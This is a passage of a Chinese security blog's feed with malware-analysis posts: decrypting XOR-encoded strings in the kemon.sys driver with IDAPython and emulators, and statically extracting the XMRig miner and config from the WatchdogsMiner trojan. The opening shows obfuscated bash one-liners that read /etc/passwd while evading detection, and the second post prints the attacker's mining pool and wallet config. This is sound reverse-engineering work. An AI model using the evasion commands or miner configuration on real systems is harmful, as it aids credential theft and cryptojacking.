&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;cat /et$&lt;span class=&quot;string&quot;&gt;&#39;c/pa\u0000/notexist/path&#39;&lt;/span&gt;sswd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;test&lt;/span&gt;=/ehhh/hmtc/pahhh/hmsswd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cat &lt;span class=&quot;variable&quot;&gt;$&amp;#123;test//hh??hm/&amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tmp_str=saudoihfnssoirtgn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cat $(&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; /e)tc$(&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; /pa)&lt;span class=&quot;variable&quot;&gt;$&amp;#123;tmp_str:9:2&amp;#125;&lt;/span&gt;wd&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="malwr" scheme="http://jiayu0x.com/tags/malwr/"/>
    
      <category term="re" scheme="http://jiayu0x.com/tags/re/"/>
    
      <category term="deobfuscation" scheme="http://jiayu0x.com/tags/deobfuscation/"/>
    
  </entry>
  
  <entry>
    <title>两种姿势批量解密恶意驱动中的上百条字串</title>
    <link href="http://jiayu0x.com/2019/03/17/two-ways-to-decrypt-cypher-str-in-malicious-driver/"/>
    <id>http://jiayu0x.com/2019/03/17/two-ways-to-decrypt-cypher-str-in-malicious-driver/</id>
    <published>2019-03-16T16:00:00.000Z</published>
    <updated>2019-03-21T09:58:30.201Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>在 360Netlab 的旧文 《<a href="https://mp.weixin.qq.com/s/KHa5GyCvbZwXruv0uK6weA" target="_blank" rel="external">“双枪”木马的基础设施更新及相应传播方式的分析</a>》 中，提到了 <strong>双枪</strong> 木马传播过程中的一个恶意驱动程序 <strong>kemon.sys</strong> ，其中有经过自定义加密的 Ascii 字符串和 Unicode 字符串 100+ 条（说是 <strong>编码</strong> 也行，毕竟不是很复杂的算法，这里就不掰扯加密跟编码的区别了）：</p>
<p><img src="/imgs/refer_content.jpg" alt=""></p>
<a id="more"></a>
<p>这在 <strong>双枪</strong> 木马的传播链条中只是一个很小的技术点，所以文中也没说具体是什么样的加密算法以及怎样解密，供分析员更方便地做样本分析工作。但这个技术点还算有点意思，尤其是对逆向入门阶段的朋友来说，可以参考一下解法。最近又碰到了这个驱动程序的最新变种，跟团队的老师傅讨教了一番，索性写篇短文记录一下。感谢老师傅们解惑(此处就不提名号了)。</p>
<p>也欢迎各路老师傅不吝赐教，提一些更快准狠的解法。</p>
<h2 id="2-样本概况"><a href="#2-样本概况" class="headerlink" title="2. 样本概况"></a>2. 样本概况</h2><blockquote>
<p>MD5： b001c32571dd72dc28fd4dba20027a88</p>
<p><strong>Note</strong>: 这是旧文中提到的旧样本，现在已经上传到 VT，想分析但下载不到的朋友可以留言，留下邮箱，我可以发到指定的邮箱。最新变种 VT 上暂时没有，我也不提供了。</p>
</blockquote>
<h3 id="2-1-字符串加密情况"><a href="#2-1-字符串加密情况" class="headerlink" title="2.1 字符串加密情况"></a>2.1 字符串加密情况</h3><p>驱动程序中用到的 100+ 条字符串都做了自定义加密处理，在设置完各 IRP 派遣函数和卸载例程之后，第一步操作就是依次解密这些字符串。IDA 中打开样本，部分解密过程如下：</p>
<p><img src="/imgs/decrypt_main_graph.png" alt=""></p>
<p>整个解密过程的函数是 <strong>sub_100038C4</strong> ，里面会多次调用两个具体的解密函数：<strong>sub10003871</strong> 和 <strong>sub_10003898</strong>，前者为解密 Ascii 字串，后者解密 Unicode 字串，都有两个参数：arg1–&gt;要解密的字符串地址；arg2–&gt;字符串长度。后面会把着两个函数分别命名为 <strong>DecryptAsciiStr</strong> 和 <strong>DecryptUnicodeStr</strong> 。这两个函数在 IDA 中看到的 xrefs 状况如下：</p>
<p><img src="/imgs/xref2decrypt_ascii.png" alt=""></p>
<p><img src="/imgs/xref2decrypt_unicode.png" alt=""></p>
<h3 id="2-2-加密算法"><a href="#2-2-加密算法" class="headerlink" title="2.2 加密算法"></a>2.2 加密算法</h3><p>前面说了，算法不复杂。以 <strong>DecryptAsciiStr</strong> 函数为例：</p>
<p><img src="/imgs/decrypt_ascii_graph.png" alt=""></p>
<p>反编译看看：</p>
<p><img src="/imgs/decrypt_ascii_decompiled.png" alt=""></p>
<p><strong>DecryptUnicodeStr</strong> 算法其实相同，只是因为字节构成不同，所以是两个解密函数分开写：</p>
<p><img src="/imgs/decrypt_unicode_decompiled.png" alt=""></p>
<p>简单总结起来，这套解密过程其实就是：把当前字节后面特定偏移处的字节与 0xC 异或，然后替换掉当前字节，把解密后的字节写入到当前位置，即完成解密。本人对密码学不熟，不知道这是不是已有名号的加密算法，看起来像是 <a href="https://en.wikipedia.org/wiki/Caesar_cipher" title="凯撒密码" target="_blank" rel="external">凯撒密码</a> 的变形加强版？对密码学有了解的朋友欢迎指教。 </p>
<h2 id="3-解密"><a href="#3-解密" class="headerlink" title="3. 解密"></a>3. 解密</h2><p>了解了上面的情况之后，就该着手解密这百十多条字符串了。既然是用 IDA 来分析这个样本，理想的状况应该是把这些字串批量解出来，直接在 IDA 中呈现，然后就可以进行后续分析了。既然是要自动化批量解密，写 IDAPython 应该算是最便捷的做法了。最终效果如图：</p>
<p><img src="/imgs/decrypted_status.png" alt=""></p>
<h3 id="3-1-姿势-1——自行实现解密算法"><a href="#3-1-姿势-1——自行实现解密算法" class="headerlink" title="3.1 姿势 1——自行实现解密算法"></a>3.1 姿势 1——自行实现解密算法</h3><p>首先想到的思路是：就两个解密算法，而且不复杂，不妨直接写个 IDAPython 脚本，实现这两个解密算法。解密之后把明文字串直接写到 IDB 文件中，在 IDA 中呈现。两个解密算法的 Python 版本分别如下(附带对 IDB 的 Patch 操作)：</p>
<p><img src="/imgs/decrypt_ascii_py.png" alt=""></p>
<p><img src="/imgs/decrypt_unicode_py.png" alt=""></p>
<p>这里稍微解释一下 <strong>make unicode str</strong> 时的操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">old_type = idc.GetLongPrm(INF_STRTYPE)</div><div class="line">idc.SetLongPrm(idc.INF_STRTYPE, idc.ASCSTR_UNICODE)</div><div class="line">idc.MakeStr(argv[<span class="number">0</span>], argv[<span class="number">0</span>]+(argv[<span class="number">1</span>]*<span class="number">2</span>))</div><div class="line">idc.SetLongPrm(idc.INF_STRTYPE, old_type)</div></pre></td></tr></table></figure>
<p>在 IDA 的 UI 界面中，可以选择生成的字符串的类型(如下图)，快捷键只有一个 <strong>A</strong>，对应的 idc 函数是 <strong>idc.MakeStr(0</strong>。然而 <strong>ida.MakeStr()</strong> 函数默认是生成 Ascii 字串的，要想生成 Unicode 字串，就需要调用  <strong>idc.SetLongPrm()</strong> 函数设置一下字符串的类型。<img src="/imgs/makestr.png" alt="1552795108347"></p>
<p>IDA 中支持的字符串类型如上图，相应地，在 idc 库中的<a href="https://github.com/tmr232/idapython/blob/master/python/idc.py" title="idc lib" target="_blank" rel="external">定义</a>如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ASCSTR_C       = idaapi.ASCSTR_TERMCHR # C-style ASCII string</div><div class="line">ASCSTR_PASCAL  = idaapi.ASCSTR_PASCAL  # Pascal-style ASCII string (length byte)</div><div class="line">ASCSTR_LEN2    = idaapi.ASCSTR_LEN2    # Pascal-style, length is 2 bytes</div><div class="line">ASCSTR_UNICODE = idaapi.ASCSTR_UNICODE # Unicode string</div><div class="line">ASCSTR_LEN4    = idaapi.ASCSTR_LEN4    # Pascal-style, length is 4 bytes</div><div class="line">ASCSTR_ULEN2   = idaapi.ASCSTR_ULEN2   # Pascal-style Unicode, length is 2 bytes</div><div class="line">ASCSTR_ULEN4   = idaapi.ASCSTR_ULEN4   # Pascal-style Unicode, length is 4 bytes</div><div class="line">ASCSTR_LAST    = idaapi.ASCSTR_LAST    # Last string type</div></pre></td></tr></table></figure>
<p>所以，要生成 Unicode 格式的字串，需要先用 <strong>idc.SetLongPrm()</strong> 函数设置一下字符串类型。其中 <strong>idc.INF_STRTYPE</strong> 即代表字符串类型的常量，在 idc 库中的<a href="https://github.com/tmr232/idapython/blob/master/python/idc.py" title="idc lib" target="_blank" rel="external">定义</a>如下：</p>
<p><img src="/imgs/INF_STRTYPE.png" alt=""></p>
<p>用 Python 实现了解密函数之后，如何模拟这一波解密过程把这 100+ 条字串依次解密呢？这里可以结合 IDA 中的 xrefs 和 <strong>idc.PrevHead()</strong> 函数来实现：</p>
<ol>
<li>先通过 xrefs 找到调用两个解密函数的位置；</li>
<li>再通过 <strong>idc.PrevHead()</strong> 定位到两个解密函数的参数地址，并解析出参数的值；</li>
<li>执行解密函数，将解密后的明文字串写回 IDB 并 MakeStr。</li>
</ol>
<h3 id="3-2-姿势-2——指令模拟"><a href="#3-2-姿势-2——指令模拟" class="headerlink" title="3.2 姿势 2——指令模拟"></a>3.2 姿势 2——指令模拟</h3><p>这个样本中的字串解密算法并不复杂，所以可以轻松写出 Python 版本，并直接用 IDAPython 脚本在 IDA 中将其批量解密。那如果字串解密算法比较复杂，用 Python 实现一版显得吃力呢？</p>
<p>这时不妨考虑一下指令模拟器。</p>
<p>近几年，<a href="https://unicorn-engine.org" title="Unicorn" target="_blank" rel="external">Unicorn</a> 作为新一代指令模拟器在业界大火。基于 Unicorn 的 IDA 指令模拟插件也不断被开发出来，比如简捷的 <a href="https://github.com/36hours/idaemu" title="IdaEmu" target="_blank" rel="external">IdaEmu</a> 和 FireEye 开发的功能强大的 <a href="https://github.com/fireeye/flare-emu" title="Flare-Emu" target="_blank" rel="external">Flare-Emu</a>。指令模拟器可以模拟执行一段汇编指令，而 IDA 中的指令模拟插件可以在 IDA 中模拟执行指定的指令片段(需要手动指定起始指令地址和结束指令地址，并设置相关寄存器的初始状态)。这样一来，我们就可以在 IDA 中，利用指令模拟插件来模拟执行上面的批量解密指令，解密字串的汇编指令模拟执行结束，字串也就自然都给解密了。</p>
<p>本文 Case 的指令模拟姿势基于 Flare-Emu。</p>
<p>不过，这个姿势需要注意两点问题：</p>
<ol>
<li>指令模拟器无法模拟系统 API ，如果解密函数中有调用系统 API 的操作，那指令模拟这个姿势就要费老劲了。</li>
<li>所谓模拟指令执行，真的只是<strong>模拟</strong>，而不会修改 IDA 中的任何数据。这样一来，需要自己把指令模拟器执行结束后的明文字串 Patch 到 IDB 文件中，这样才能在 IDA 中看到明文字串。</li>
</ol>
<h4 id="3-2-1-hook-api"><a href="#3-2-1-hook-api" class="headerlink" title="3.2.1 hook api"></a>3.2.1 hook api</h4><p>第 1 点问题，IdaEmu 中需要自己实现相关 API 的功能，并对指令片段中相应的 API 进行 Hook，才能顺利模拟。比如下图示例中，指令片段里调用了 <code>_printf</code> 函数，那么就需要我们手动实现 <code>_printf</code> 的功能并 Hook 掉指令片段中的 <code>_printf</code> 才行：</p>
<p><img src="/imgs/idaemu_call_hook.png" alt=""></p>
<p>而 Flare-Emu 就做的更方便了，他们直接在框架中实现了一些基础的系统 API，而不用自己手动实现并进行 Hook 操作：</p>
<p><img src="/imgs/flareemu_apihook.png" alt=""></p>
<p>之所以提这么个问题，是因为这个 kemon.sys 样本中的批量解密字串的过程中，涉及了对 <code>memcpy</code> 函数的调用：</p>
<p><img src="/imgs/decrypt_main_memcpy.png" alt=""></p>
<p>这样一来，直接用 Flare-Emu 来模拟执行应该是个更便捷的选项。</p>
<h4 id="3-2-2-Patch-IDB"><a href="#3-2-2-Patch-IDB" class="headerlink" title="3.2.2 Patch IDB"></a>3.2.2 Patch IDB</h4><p>第 2 点问题，将模拟结果写回 IDB 文件，在 IDA 中显示。</p>
<p>首要问题是如何获模拟执行成功后的结果——明文字符串。前面描述字串解密算法时说过，解密后的字节(Byte)会直接替换密文中的特定字节，把密文的前 <strong>dataLen</strong> 个字节解密出来，就是明文字串。这个字节替换的操作，其实对应 Unicorn 指令模拟器中定义的 <strong>MEM_WRITE</strong> 操作，即<strong>写内存</strong>，而且，字串解密过程中也只有这个字串替换操作会「写内存」。恰好，Flare-Emu 中提供了一个 <strong>memAccessHook()</strong> 接口(如下图)，可以 Hook 多种内存操作：</p>
<blockquote>
<p><strong>memAccessHook</strong> can be a function you define to be called whenever memory is accessed for reading or writing. It has the following prototype: <code>memAccessHook(unicornObject, accessType, memAccessAddress, memAccessSize, memValue, userData)</code>.</p>
</blockquote>
<p>Unicorn 支持 Hook 的的内存操作有<a href="https://github.com/unicorn-engine/unicorn/blob/master/bindings/python/unicorn/unicorn_const.py#L64" title="uc const" target="_blank" rel="external">以下几个</a>：</p>
<p><img src="/imgs/uc_mem_op.png" alt=""></p>
<p>于是，我们 Hook 掉指令模拟过程中的 <strong>UC_MEM_WRITE</strong> 操作，即可获取解密后的字节，并将这些字节手动 Patch 到 IDB 中：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">mem_hook</span><span class="params">(unicornObject, accessType, memAccessAddress, memAccessSize, memValue, userData)</span>:</span></div><div class="line">    <span class="comment">#if accessType == UC.UC_MEM_READ:</span></div><div class="line">    <span class="comment">#    print("Read: ", hex(memAccessAddress), memAccessSize, hex(memValue))</span></div><div class="line">    <span class="keyword">if</span> accessType == UC.UC_MEM_WRITE:</div><div class="line">        <span class="comment">#print("Write: ", hex(memAccessAddress), memAccessSize, hex(memValue))</span></div><div class="line">        <span class="keyword">if</span> memAccessSize == <span class="number">1</span>:</div><div class="line">            idc.PatchByte(memAccessAddress, memValue)</div><div class="line">        <span class="keyword">elif</span> memAccessSize == <span class="number">2</span>:</div><div class="line">            idc.PatchWord(memAccessAddress, memValue)</div><div class="line">        <span class="keyword">elif</span> memAccessSize == <span class="number">4</span>:</div><div class="line">            idc.PatchDword(memAccessAddress, memValue)</div></pre></td></tr></table></figure>
<p>Patch IDB 的基本操作当然是像前文中 IDAPython 脚本那样，调用 <strong>idc.PatchXXX</strong> 函数写入 IDB 文件。前面第一个姿势中，Patch IDB 文件，只调用了一个 <strong>idc.PatchByte()</strong> 函数。其实，idc 库中共有 4 个函数可以 Patch IDB：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">idc.PatchByte(): Patch 1 Byte;</div><div class="line">idc.PatchWord(): Patch 2 Bytes;</div><div class="line">idc.PatchDword(): Patch 4 Bytes;</div><div class="line">idc.PatchQword(): Patch 8 Bytes;</div></pre></td></tr></table></figure>
<p>指令模拟器中执行 Patch 的操作，并不只有 <strong>PatchByte</strong> 这一项。根据我 print 出来的指令模拟过程中写内存操作的细节，可以看到共涉及 3 种 Patch 操作(如下图)：1 byte、2 Bytes 和 4 Bytes，所有才有了上面 <strong>mem_hook()</strong> 函数中的 3 种 <strong>memAccessSize</strong>。</p>
<p><img src="/imgs/decrypt_mem_size.png" alt=""></p>
<p>明确并解决了「系统 API Hook」和「捕获指令模拟结果并 Patch IDB」这两点问题，就可以写出准确无误的 IDAPython 脚本了。</p>
<h3 id="3-2-3-Radare2-ESIL-模拟"><a href="#3-2-3-Radare2-ESIL-模拟" class="headerlink" title="3.2.3 Radare2 ESIL 模拟"></a>3.2.3 Radare2 ESIL 模拟</h3><p>r2 上也有强大的指令模拟器，名为 <strong>ESIL</strong>( <a href="https://radare.gitbooks.io/radare2book/content/esil.html" target="_blank" rel="external">Evaluable Strings Intermediate Language</a>)：</p>
<p><img src="/imgs/r2_intro.png" alt=""></p>
<p>在 r2 上用这个东西来模拟指令解密这一批字符串，就不用像 IDA 中那样还要自己动手写 IDAPython 脚本了，只需要通过 r2 指令配置好几个相关参数即可。下面两张图是在 r2 中通过指令模拟批量解密这些字符串的前后对比：</p>
<p><img src="/imgs/r2_emu_origin.png" alt=""></p>
<p><img src="/imgs/r2_emu.png" alt=""></p>
<p>具体操作方法就不细说了，有兴趣的朋友可以自行探索。</p>
<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h2><p>文中介绍两种基本方法，在 IDA 中批量解密 <strong>双枪</strong> 木马传播中间环节的恶意驱动 kemon.sys 中的大量自定义加密字串：Python 实现解密函数和指令模拟解密函数。</p>
<p>原理都很简单，介绍的有点啰嗦，希望把每个关键细节都描述清楚了。</p>
<p>两种方法对应的 IDAPython 脚本，已上传到 Github，以供参考:</p>
<p><a href="https://github.com/0xjiayu/decrypt_CypherStr_kemonsys" target="_blank" rel="external">https://github.com/0xjiayu/decrypt_CypherStr_kemonsys</a></p>
<h2 id="5-参考资料："><a href="#5-参考资料：" class="headerlink" title="5. 参考资料："></a>5. 参考资料：</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1. 前言&quot;&gt;&lt;/a&gt;1. 前言&lt;/h2&gt;&lt;p&gt;在 360Netlab 的旧文 《&lt;a href=&quot;https://mp.weixin.qq.com/s/KHa5GyCvbZwXruv0uK6weA&quot;&gt;“双枪”木马的基础设施更新及相应传播方式的分析&lt;/a&gt;》 中，提到了 &lt;strong&gt;双枪&lt;/strong&gt; 木马传播过程中的一个恶意驱动程序 &lt;strong&gt;kemon.sys&lt;/strong&gt; ，其中有经过自定义加密的 Ascii 字符串和 Unicode 字符串 100+ 条（说是 &lt;strong&gt;编码&lt;/strong&gt; 也行，毕竟不是很复杂的算法，这里就不掰扯加密跟编码的区别了）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/imgs/refer_content.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="malwr" scheme="http://jiayu0x.com/tags/malwr/"/>
    
      <category term="re" scheme="http://jiayu0x.com/tags/re/"/>
    
      <category term="decrypt" scheme="http://jiayu0x.com/tags/decrypt/"/>
    
  </entry>
  
  <entry>
    <title>静态分析提取 WatchdogsMiner 木马中的矿机程序</title>
    <link href="http://jiayu0x.com/2019/02/24/extract-compressed-files-by-static-analysis-in-watchdogsminer/"/>
    <id>http://jiayu0x.com/2019/02/24/extract-compressed-files-by-static-analysis-in-watchdogsminer/</id>
    <published>2019-02-23T16:00:00.000Z</published>
    <updated>2019-03-21T06:37:35.367Z</updated>
    
    <content type="html"><![CDATA[<p>这周末爆发的新型 Linux 挖矿木马 WatchdogsMiner，有两家厂商分析的挺详细，尤其是腾讯云鼎实验室的分析，全面而深入。看完他们的的分析很有收获，也才发现这个 WatchdogsMiner 比之前想象的复杂一些：</p>
<ul>
<li>腾讯云鼎： <a href="https://mp.weixin.qq.com/s/3V0HVEREZWU8SkRWLspaxg" target="_blank" rel="external">事件分析 | Linux watchdogs 感染性隐藏挖矿病毒入侵还原录</a></li>
<li>深信服： <a href="https://mp.weixin.qq.com/s/dwY--BLzcyeXqPUZlhb__Q" target="_blank" rel="external">紧急预警！WatchDogsMiner挖矿蠕虫大量感染Linux服务器</a></li>
</ul>
<p>但是有一个参与此次木马应急响应的朋友指出：里面有个关键的挖矿模块 <code>/tmp/ksoftirqds</code> ，目前公开的分析文章中看他们并没有提到捕获的细节(当然，不是说他们没有搞定这一点，只是没在文中提及细节)。</p>
<p>说的也是，既然是<strong>挖矿木马</strong>，个人认为分析的时候要重点关注 3 个要素：</p>
<ol>
<li>矿机程序(Hash 值、由什么开源矿机编译而来、版本等等）；</li>
<li>挖矿配置（挖矿账号、矿池地址，有的还有自建挖矿代理服务器）；</li>
<li>挖矿收益（可选，因为在某些情况下查不到）。</li>
</ol>
<a id="more"></a>
<p>腾讯云鼎实验室的分析文章里给出了挖矿账号、矿池地址和挖矿收益信息，但关于挖矿程序信息并没有多说，文末也并没给出挖矿程序的 MD5。鄙人姑且一试，看能不能就这一点为公开的技术文章做一个小补充。</p>
<p>因为这个矿机程序在运行起来之后就被主样本删除了本地的执行体，并做了进程隐藏。一起探讨这个事件的朋友说，矿机程序可能需要动态分析的时候提取出来，或者做删除文件的还原操作，当然，也可以找到隐藏的挖矿进程把它从内存中 Dump 出来。挖矿账号和矿池地址在运行木马程序后抓包一般也能抓到……</p>
<p>周末白天出去浪，晚上回来大致看了一眼，发现用静态分析的方法，就可以从 Go 语言编写的 ELF 主木马样本中提取矿机程序和挖矿配置的文件。这里简单说一下思路。</p>
<p>以 WatchdogMiner 的 32bit 样本(UPX packed，MD5: <strong>aee3a19beb22527a1e0feac76344894c</strong> ，下文简称 <strong>主木马</strong>)为例来分析，这是一个 Go 语言编译来的 ELF 程序，其中有一批函数看起来 import 了 <code>github_con_hippies_LSD</code> 这个包：</p>
<p><img src="/imgs/watchdogs_funclist.png" alt=""></p>
<p>但是，我们如果去 Github 上找这一个 <code>hippies/LSD</code> 的 Go 语言包，会发现 <strong>Github 上根本没有这个包</strong>。以前有人讲过 Go 语言二进制的混淆技巧，其中之一就是修改 import 进来的 Go 语言包的名字，用来迷惑分析人员。这里可以猜测主样本用了这个混淆技巧，即：这个所谓的 <code>hippies/LSD</code> 包，是一个别的 Go 语言包，可能是木马作者自己开发的，也可能是网上公开的别的开源 Go 语言包(做这种混淆的话，一般都是针对开源 Go 语言包，因为如果被分析人员发现用了什么包，分析人员就可以直接去参考 Go 语言包的 Docs 或者源码，对逆向分析木马程序帮助很大)。</p>
<p>这一点很有意思，这是鄙人第一次见到这种情况的 Go 语言二进制文件，也是促使我稍微深入一探究竟的原因之一。</p>
<p>那么这个包在这个木马程序中有什么用？简单分析就知道，这个包<strong>在执行 <code>Go build</code> 命令来编译最终的二进制程序时，可以把程序用到的文件打包到最终的 EFL 文件中</strong>。具体到这个木马上来看，矿机程序 <strong>ksoftirqds</strong> 和矿机配置文件 <strong>config.json</strong> 其实都已经被以二进制数据的形式打包在了 ELF 格式的主木马文件中，并且在木马执行过程中释放出来。</p>
<p>于是我们就可以看看，能不能直接静态逆向，在 IDA 中直接把矿机程序文件和矿机配置文件从主木马中提取出来。</p>
<p>我们不能准确知道这个 Go 语言包是什么，但好在它并不复杂，直接在 IDA 里就能分析出来关键函数的实现逻辑。这个 Go 语言包的主要的作用是<strong>把要打包的文件用 GZip 格式压缩，然后打包进 ELF 文件中</strong>。</p>
<p>WatchdogMiner 的主木马中，有一个 <code>github_com_hippies_LSD_LSDB__ksoftirqds32Bytes</code> 函数，该函数的核心逻辑如下：</p>
<p><img src="/imgs/watchdogs_addr_length.png" alt=""></p>
<p>上图已经标出： <code>addr_ptr</code> (off_851FAC8 )就是 GZip 压缩后的 <code>ksoftirqds</code> 文件地址的指针(指针值是 <code>byte_84A3580</code> ，即最终的 GZip 文件地址)，下面的参数即为 Gzip 文件 <code>length</code> 地址(length: 0x7BCE6)。</p>
<p>然后，在随后调用的函数 <code>github_com_hippies_LSD_LSDC_Read</code> 我们可以看到对 <code>compress/gzip/NewReader</code> 的调用，这里就确定了我们前面提到的结论：这个 <code>hippies/LSD</code> 包的主要作用是：GZip 压缩文件、把压缩后的文件编译打包进 ELF 主木马中：</p>
<p><img src="/imgs/watchdogs_gzip_decompress.png" alt=""></p>
<p>查看 GZip 数据地址 <code>byte_84A3580</code> 的内容，就可以看到前两个字节 <code>1F8Bh</code> ，即为 GZip 格式的文件头标志：</p>
<p><img src="/imgs/watchdogs_gzip_flag.png" alt=""></p>
<p> 上面是矿机程序的情况，矿机配置文件 <code>config.json</code> 的情况也一毛一样。OK，明白了原理，再从主木马程序文件中提取矿机程序和矿机配置文件就很 Easy 了：</p>
<ol>
<li>在 IDA 中先找到他们的 GZip 压缩数据的 addr 和 length；</li>
<li>在 IDA 中把这一段数据 dump 出来；</li>
<li>用 GZip 解压 dump 出来的二进制数据，Over。</li>
</ol>
<p><strong>结论</strong></p>
<p>我从 WatchdogMiner 的 32bit 样本(MD5: <strong>aee3a19beb22527a1e0feac76344894c</strong> )  中提取出来的矿机程序也加了 UPX 壳，脱壳后发现是由 <strong>XMRig2.8.0 RC</strong>  编译而来；矿机配置文件 <code>config.json</code> 没加壳。IDA 中打开矿机程序截图如下：</p>
<p><img src="/imgs/watchdogs_miner_info.png" alt=""></p>
<p>配置文件的内容如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">"algo"</span>: <span class="string">"cryptonight"</span>,</div><div class="line">    <span class="attr">"api"</span>: &#123;</div><div class="line">        <span class="attr">"port"</span>: <span class="number">0</span>,</div><div class="line">        <span class="attr">"access-token"</span>: <span class="literal">null</span>,</div><div class="line">        <span class="attr">"id"</span>: <span class="literal">null</span>,</div><div class="line">        <span class="attr">"worker-id"</span>: <span class="literal">null</span>,</div><div class="line">        <span class="attr">"ipv6"</span>: <span class="literal">false</span>,</div><div class="line">        <span class="attr">"restricted"</span>: <span class="literal">true</span></div><div class="line">    &#125;,</div><div class="line">    <span class="attr">"asm"</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">"autosave"</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">"av"</span>: <span class="number">0</span>,</div><div class="line">    <span class="attr">"background"</span>: <span class="literal">false</span>,</div><div class="line">    <span class="attr">"colors"</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">"cpu-affinity"</span>: <span class="literal">null</span>,</div><div class="line">    <span class="attr">"cpu-priority"</span>: <span class="literal">null</span>,</div><div class="line">    <span class="attr">"donate-level"</span>: <span class="number">0</span>,</div><div class="line">    <span class="attr">"huge-pages"</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">"hw-aes"</span>: <span class="literal">null</span>,</div><div class="line">    <span class="attr">"log-file"</span>: <span class="literal">null</span>,</div><div class="line">    <span class="attr">"max-cpu-usage"</span>: <span class="number">100</span>,</div><div class="line">    <span class="attr">"pools"</span>: [</div><div class="line">        &#123;</div><div class="line">            <span class="attr">"url"</span>: <span class="string">"stratum+tcp://xmr.f2pool.com:13531"</span>,</div><div class="line">            <span class="attr">"user"</span>: <span class="string">"46FtfupUcayUCqG7Xs7YHREgp4GW3CGvLN4aHiggaYd75WvHM74Tpg1FVEM8fFHFYDSabM3rPpNApEBY4Q4wcEMd3BM4Ava.teny"</span>,</div><div class="line">            <span class="attr">"pass"</span>: <span class="string">"x"</span>,</div><div class="line">            <span class="attr">"rig-id"</span>: <span class="literal">null</span>,</div><div class="line">            <span class="attr">"nicehash"</span>: <span class="literal">false</span>,</div><div class="line">            <span class="attr">"keepalive"</span>: <span class="literal">false</span>,</div><div class="line">            <span class="attr">"variant"</span>: <span class="number">-1</span>,</div><div class="line">            <span class="attr">"tls"</span>: <span class="literal">false</span>,</div><div class="line">            <span class="attr">"tls-fingerprint"</span>: <span class="literal">null</span></div><div class="line">        &#125;</div><div class="line">    ],</div><div class="line">    <span class="attr">"print-time"</span>: <span class="number">60</span>,</div><div class="line">    <span class="attr">"retries"</span>: <span class="number">5</span>,</div><div class="line">    <span class="attr">"retry-pause"</span>: <span class="number">5</span>,</div><div class="line">    <span class="attr">"safe"</span>: <span class="literal">false</span>,</div><div class="line">    <span class="attr">"threads"</span>: <span class="literal">null</span>,</div><div class="line">    <span class="attr">"user-agent"</span>: <span 